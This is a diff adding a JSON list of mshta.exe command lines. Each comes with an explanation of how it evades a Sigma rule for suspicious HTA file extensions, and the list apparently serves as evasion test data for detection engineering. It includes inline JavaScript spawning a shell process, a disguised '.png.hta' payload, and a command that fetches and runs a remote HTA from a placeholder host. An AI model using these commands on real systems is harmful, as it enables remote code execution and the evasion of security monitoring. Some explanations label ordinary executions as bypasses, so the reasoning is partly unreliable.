@@ -1,0 +1,22 @@
+[
+  {
+    "output": "mshta.exe \"C:\\Users\\Public\\payload.png.hta\"",
+    "explanation": "The .hta extension is appended to a suspicious file extension (.png) to maintain the file as an HTA, thus bypassing the rule's check for suspicious extensions while still being valid."
+  },
+  {
+    "output": "mshta.exe \"javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe');window.close();\"",
+    "explanation": "This command uses JavaScript to execute a payload inline, avoiding the need for a file with a suspicious extension, which is not flagged by the Sigma rule."
+  },
+  {
+    "output": "mshta.exe \"C:\\Users\\Public\\script.hta\"",
+    "explanation": "This is a legitimate HTA file with a correct .hta extension, which does not match the rule's detection criteria for suspicious extensions."
+  },
+  {
+    "output": "mshta.exe \"http://example.com/payload.hta\"",
+    "explanation": "Accessing a remote HTA file with a valid .hta extension does not trigger the rule, as the rule focuses on suspicious extensions like .png or .jpg."
+  },
+  {
+    "output": "mshta.exe \"C:\\Users\\Public\\payload.hta\"",
+    "explanation": "This is a direct execution of a .hta file, which is not flagged by the Sigma rule as it does not contain a suspicious extension."
+  }
+]
